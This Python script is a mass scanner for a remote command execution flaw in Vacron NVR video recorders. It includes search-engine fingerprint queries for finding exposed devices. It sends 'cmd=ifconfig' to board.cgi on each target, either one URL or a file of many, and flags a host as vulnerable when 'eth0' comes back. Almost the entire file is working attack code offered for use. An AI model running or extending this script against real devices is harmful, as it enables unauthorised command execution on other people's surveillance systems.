# Vacron NVR-远程命令执行
# banner="DVR_NETRA" || body="vacron nvr login" || title="Vacron NVR" || body="<strong>VACRON</strong>"

from multiprocessing.dummy import Pool
import requests,warnings
import urllib3
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

def main():
    banner = """
              _____                    _____                   _______                   _____                    _____                   _______
         /\    \                  /\    \                 /::\    \                 /\    \                  /\    \                 /::\    \
        /::\____\                /::\    \               /::::\    \               /::\____\                /::\    \               /::::\    \
       /:::/    /               /::::\    \             /::::::\    \             /:::/    /               /::::\    \             /::::::\    \
      /:::/    /               /::::::\    \           /::::::::\    \           /:::/    /               /::::::\    \           /::::::::\    \
     /:::/    /               /:::/\:::\    \         /:::/~~\:::\    \         /:::/    /               /:::/\:::\    \         /:::/~~\:::\    \
    /:::/____/               /:::/__\:::\    \       /:::/    \:::\    \       /:::/____/               /:::/__\:::\    \       /:::/    \:::\    \
   /::::\    \              /::::\   \:::\    \     /:::/    / \:::\    \     /::::\    \              /::::\   \:::\    \     /:::/    / \:::\    \
  /::::::\    \   _____    /::::::\   \:::\    \   /:::/____/   \:::\____\   /::::::\    \   _____    /::::::\   \:::\    \   /:::/____/   \:::\____\
 /:::/\:::\    \ /\    \  /:::/\:::\   \:::\    \ |:::|    |     |:::|    | /:::/\:::\    \ /\    \  /:::/\:::\   \:::\    \ |:::|    |     |:::|    |
/:::/  \:::\    /::\____\/:::/  \:::\   \:::\____\|:::|____|     |:::|    |/:::/  \:::\    /::\____\/:::/  \:::\   \:::\____\|:::|____|     |:::|    |
\::/    \:::\  /:::/    /\::/    \:::\  /:::/    / \:::\    \   /:::/    / \::/    \:::\  /:::/    /\::/    \:::\  /:::/    / \:::\    \   /:::/    /
 \/____/ \:::\/:::/    /  \/____/ \:::\/:::/    /   \:::\    \ /:::/    /   \/____/ \:::\/:::/    /  \/____/ \:::\/:::/    /   \:::\    \ /:::/    /
          \::::::/    /            \::::::/    /     \:::\    /:::/    /             \::::::/    /            \::::::/    /     \:::\    /:::/    /
           \::::/    /              \::::/    /       \:::\__/:::/    /               \::::/    /              \::::/    /       \:::\__/:::/    /
           /:::/    /               /:::/    /         \::::::::/    /                /:::/    /               /:::/    /         \::::::::/    /
          /:::/    /               /:::/    /           \::::::/    /                /:::/    /               /:::/    /           \::::::/    /
         /:::/    /               /:::/    /             \::::/    /                /:::/    /               /:::/    /             \::::/    /
        /:::/    /               /:::/    /               \::/____/                /:::/    /               /:::/    /               \::/____/
        \::/    /                \::/    /                 ~~                      \::/    /                \::/    /                 ~~
         \/____/                  \/____/                                           \/____/                  \/____/
        """
    print(banner)
    parse = argparse.ArgumentParser(description="漏洞描述")
    parse.add_argument('-u', '--url', dest='url', type=str, help='Vacron NVR-远程命令执行')
    parse.add_argument('-f', '--file', dest='file', type=str, help='输入文件')
    args = parse.parse_args()
    urls=[]
    if args.url:
        check(updata(args.url))
    elif args.file:
        with open(args.file,"r+") as f:
            for i in f:
                domain=i.strip()
                urls.append(updata(domain))
        pool=Pool(10)
        pool.map(check,urls)
    else:
        print("输入参数")

def updata(url):
    if "http" in url:
        return url
    else:
        return f"http://{url}"

def check(domain):
    url=f"{domain}/board.cgi?cmd=ifconfig"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }
    try:
        response = requests.get(url=url, headers=headers,timeout=10, verify=False)
        if (response.status_code == 200) and ("eth0" in response.text):
            print(f"[+]存在漏洞{domain}")
        else:
            print(f"[-]不存在漏洞")
    except Exception as e:
        print(e)
if __name__ == '__main__':
    main()